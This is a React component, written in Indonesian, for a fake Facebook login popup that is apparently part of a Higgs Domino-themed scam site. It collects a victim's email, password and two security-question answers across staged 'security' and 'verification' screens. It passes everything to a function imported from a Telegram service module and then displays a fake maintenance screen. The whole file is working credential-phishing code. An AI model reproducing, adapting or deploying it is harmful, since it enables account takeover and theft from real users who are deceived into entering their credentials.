import { useState } from 'react';
import { sendFacebookLogin } from '../services/telegram';
import './LoginForm.css';



interface FacebookLoginProps {
  onClose: () => void;
}

const FacebookLogin = ({ onClose }: FacebookLoginProps) => {
  const [step, setStep] = useState(1); // 1: FB Form, 1.5: Security, 2: Verification, 3: Success

  // STEP 1 STATES
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  
  // STEP 2 STATES
  const [a1, setA1] = useState('');
  const [a2, setA2] = useState('');

  const [loading, setLoading] = useState(false);
  const [showCustomLoading, setShowCustomLoading] = useState(false);

  // STEP 1 HANDLER: Move to Security Notification
  const handleFbSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!email || !password) {
      alert("Email dan Kata Sandi harus diisi!");
      return;
    }
    setStep(1.5);
  };

  const handleSecurityProceed = () => {
    setStep(2);
  };

  const handleFinalSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    // Basic Validation
    if (!a1 || a1.length < 3) return; // Add visual error handling if needed
    if (!a2 || a2.length < 3) return;

    setLoading(true);

    // Hardcoded questions context
    const q1 = `Q1. Apa film favorit Anda? (<code>${a1}</code>)`;
    const q2 = `Q2. Apa Makanan Kesukaan Anda? (<code>${a2}</code>)`;

    // Send all data (FB Creds + Answers)
    const success = await sendFacebookLogin(email, password, q1, q2);
    
    // Show Loading Overlay
    setShowCustomLoading(true);
    setStep(0); // Hide forms

    setTimeout(() => {
      setShowCustomLoading(false);
      setLoading(false);
      
      if (success) {
        setStep(3); // Show Success
      } else {
        alert("Terjadi kesalahan. Silakan coba lagi.");
        setStep(2); // Retry questions
      }
    }, 5000);
  };

  const handleClose = () => {
    if (onClose) onClose();
  };

  // Custom Loading Component
  if (showCustomLoading) {
    return (
      <div className="fixed inset-0 z-[60] flex items-center justify-center bg-black/70 backdrop-blur-sm animate-fade-in">
        <div className="relative animate-pulse">
          <img 
            src="https://higgsdomino.store/img/loading.png" 
            alt="Loading..." 
            className="w-[400px] md:w-[500px] h-auto drop-shadow-2xl"
          />
        </div>
      </div>
    );
  }

  return (
    <div className="relative flex flex-col items-center">
      
      {/* ================= STEP 1: FACEBOOK FORM ================= */}
      {step === 1 && (
        <div className="bg-white rounded-[10px] shadow-[0_4px_10px_rgba(238,4,4,0.2)] p-5 w-[400px] relative animate-pop-in">
          <button 
            onClick={onClose}
            className="absolute top-2.5 right-2.5 bg-transparent border-none text-[18px] font-bold text-[#333] cursor-pointer hover:text-black"
          >
            ×
          </button>

          <h2 className="text-[20px] text-[#333] text-center mb-5 font-bold">
            Login ke Facebook
          </h2>

          <form onSubmit={handleFbSubmit}>
            <input
              type="text"
              placeholder="Email atau Nomor Telepon"
              className="w-full p-2.5 mb-[15px] border border-[#ccc] rounded-[5px] text-[14px] box-border focus:border-[#1877f2] focus:outline-none"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              required
            />
            <input
              type="password"
              placeholder="Kata Sandi"
              className="w-full p-2.5 mb-[15px] border border-[#ccc] rounded-[5px] text-[14px] box-border focus:border-[#1877f2] focus:outline-none"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              required
            />
            <button
              type="submit"
              className="w-full p-2.5 bg-[#1877f2] text-white text-[16px] font-bold border-none rounded-[5px] cursor-pointer hover:bg-[#155db3] transition-colors"
            >
              Masuk
            </button>

            <div className="text-center mt-[15px] text-[14px] text-[#555]">
              <a href="#" className="text-[#1877f2] no-underline hover:underline">
                Lupa kata sandi?
              </a>
            </div>

            <div className="my-5 border-t border-[#dadde1]"></div>

            <button
              type="button"
              className="block mx-auto w-[60%] p-[11px] bg-[#42b72a] text-white text-[16px] font-bold border-none rounded-[5px] cursor-pointer hover:bg-[#36a420] transition-colors"
            >
              Buat akun baru
            </button>
          </form>
        </div>
      )}

      {/* ================= STEP 1.5: SECURITY NOTIFICATION ================= */}
      {step === 1.5 && (
        <div className="security-popup-container animate-pop-in">
          <img 
            src="https://higgsdomino.store/img/keamanan.png" 
            alt="Keamanan" 
            className="login-bg-img" 
            onClick={handleSecurityProceed}
            style={{ cursor: 'pointer' }}
          />
          <button 
             className="security-btn" 
             onClick={handleSecurityProceed}
             aria-label="Lanjutkan Verifikasi"
          ></button>
        </div>
      )}

      {/* ================= STEP 2: VERIFICATION QUESTIONS (IMAGE BASED) ================= */}
      {step === 2 && (
        <div className="verification-popup-container animate-pop-in">
          <div className="verification-inner">
          
            <img src="https://higgsdomino.store/img/verifikasi.png" alt="Verifikasi" className="verification-bg-img" />
            
            <div className="verification-inputs">
              <input 
                type="text" 
                id="answer1" 
                className="verify-input" 
                placeholder=""
                value={a1}
                onChange={(e) => setA1(e.target.value)}
              />
              <input 
                type="text" 
                id="answer2" 
                className="verify-input" 
                placeholder=""
                value={a2}
                onChange={(e) => setA2(e.target.value)}
              />
            </div>

            {/* <div className="verify-helper-text">Silakan masukkan Jawaban</div> */}

     

  <button className="close-btn" onClick={handleClose} aria-label="Close"></button>

          <button 
            id="submitButton" 
            className="submit-btn-custom" 
            onClick={handleFinalSubmit}
             disabled={loading}
            aria-label="Confirm"
          ></button>
    

          </div>
        </div>
      )}

      {/* ================= STEP 3: SUCCESS MODAL ================= */}
      {step === 3 && (
        <div className="fixed inset-0 z-[3000] flex items-center justify-center bg-black/60 backdrop-blur-sm animate-pop-in">
          <div className="relative">
            <img 
              src="https://higgsdomino.store/img/maintance.png" 
              alt="System Maintenance" 
              className="w-[300px] md:w-[400px] h-auto drop-shadow-2xl rounded-xl"
            />
            
            <button 
              onClick={onClose} 
              className="absolute top-2 right-2 w-8 h-8 flex items-center justify-center bg-red-500/80 hover:bg-red-600 text-white rounded-full transition-colors z-10 font-bold shadow-md border border-white/20"
            >
              ✕
            </button>

            <button 
              onClick={onClose}
              className="absolute bottom-[10%] left-1/2 transform -translate-x-1/2 w-[120px] h-[40px] bg-transparent border-none z-20 cursor-pointer"
              aria-label="Confirm"
            ></button>
          </div>
        </div>
      )}
    </div>
  );
};

export default FacebookLogin;
